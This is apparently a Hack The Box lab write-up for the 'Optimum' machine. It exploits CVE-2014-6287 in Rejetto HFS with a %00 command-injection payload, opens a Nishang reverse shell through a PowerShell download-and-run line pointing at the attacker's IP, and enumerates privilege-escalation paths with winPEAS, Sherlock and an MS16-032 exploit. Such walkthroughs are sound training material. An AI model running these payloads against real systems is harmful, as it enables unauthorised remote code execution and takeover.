# Hack The Box - Optimum

```CSS
Machine IP: 10.10.10.8

Vulnerabilities:
  - Rejetto HTTP File Server 2.3: CVE-2014-6287 (w/o MetaSploit)
```

## NMAP
```CSS
▶ nmap -Pn -sS -p- 10.10.10.8 -T4 --min-rate 1000 -oN surface.nmap

Nmap scan report for 10.10.10.8
Host is up (0.18s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```

```CSS
▶ nmap -sC -sV -p 80 10.10.10.8 -oN deep.nmap

Nmap scan report for 10.10.10.8
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## HTTP #80
![image](https://user-images.githubusercontent.com/83878909/235110690-0249d8ca-39e8-42c0-b237-2aab3e219a96.png)

### HTTP File Server 2.3
  - CVE-2014-6287 : The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aka HFS or HTTP Fileserver) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.

### Exploit
![image](https://user-images.githubusercontent.com/83878909/236133911-37a8b4c2-129c-4215-81f0-4b67efba6033.png)

#### Command Execution

```CSS
▶ tcpdump -i tun0
```
```CSS
%00{.exec|ping 10.10.14.21.}
```
![image](https://user-images.githubusercontent.com/83878909/236135355-c044f521-5cea-4d4c-abb3-95aafa954d6c.png)
![image](https://user-images.githubusercontent.com/83878909/236134669-802324a7-fbd7-4cf3-9cd8-6bc4c8336c04.png)

#### Reverse Shell (Nishang)

- `Invoke-PowerShellTcp.ps1`
![image](https://user-images.githubusercontent.com/83878909/236135960-4b5a97fd-8c54-4847-ac0e-f6e6c1dbed23.png)

  - Copy and Paste the line of code to the bottom of the sciript.
  - Edit the code.
![image](https://user-images.githubusercontent.com/83878909/236136805-0bc1601e-7bad-4b11-bad7-3206cf2f3dcd.png)
![image](https://user-images.githubusercontent.com/83878909/236137400-fad06366-6e40-4a1f-b0de-1f1d8831b9ff.png)

  - Upload the `Nishang` script.
  - Start a reverse `Netcat` listener.

```CSS
%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.21:8000/Invoke-PowerShellTcp.ps1**w**').}
```
![image](https://user-images.githubusercontent.com/83878909/236139893-93d6cafd-91f1-4da8-94cc-4c2a5ca6079b.png)
![image](https://user-images.githubusercontent.com/83878909/236139759-484a70c3-ca74-4e01-9096-50befb2d0dc6.png)

  - Target system information.
```CSS
PS C:\Users\kostas\Desktop>systeminfo                                                
```
![image](https://user-images.githubusercontent.com/83878909/236140832-cb67ae27-8fb1-42cf-8dcc-b03aca12c96c.png)

## Privilege Escalation

### WinPEAS
  - Start SMB server.
```CSS
▶ sudo impacket-smbserver share . -smb2support
```
  - Copy `winPEASx64.exe` to optimum.
```CSS
▶ copy \\10.10.14.21\share\winPEASx64.exe .
```
![image](https://user-images.githubusercontent.com/83878909/236153111-422fdf8f-75cd-46dd-83f1-ab8a88d517ad.png)

  - Execute `winPEASx64.exe`.
```CSS
PS C:\Users\kostas\desktop> ./winPEASx64.exe           
```
![image](https://user-images.githubusercontent.com/83878909/236154915-b4378173-3efa-4131-b365-dd54291fe8a2.png)
No useful information was found.

## Sherlock
  - Python Server
```CSS
▶ python -m http.server
```
![image](https://user-images.githubusercontent.com/83878909/236175398-fe8dee40-3e4d-492d-938d-9d32b5f117da.png)

  - Edit, Upload and Run: `Sherlock.ps1`.
  - Add the line `Find-AllVulns` at the end of the script to call this function.

![image](https://user-images.githubusercontent.com/83878909/236176477-6d64ec41-f579-4af4-bdb5-8986fd93981f.png)

```
PS C:\Users\kostas\desktop> IEX(New-Object Net.Webclient).downloadString('http://10.10.14.21:8000/Sherlock.ps1')

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems                                                                                                                               

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable                                                                                                                                                
Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems                                                                                                                               

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable


Title      : Font Driver Buffer Overflow                                                                                                                           [0/1931]
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege 
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable
```
![image](https://user-images.githubusercontent.com/83878909/236177482-a698cbdc-787e-4423-9048-474213818c6f.png)

### Searchsploit
```CSS
▶ searchsploit MS16-032
```
![image](https://user-images.githubusercontent.com/83878909/236182297-7f6de133-fd91-455a-b1f3-75d1261c90bf.png)

### PowerShell Empire
  - Download Exploit: `wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1`
```CSS
▶ 
```

Optional Reference: https://0xdf.gitlab.io/2021/03/17/htb-optimum.html#the-importance-of-architecture
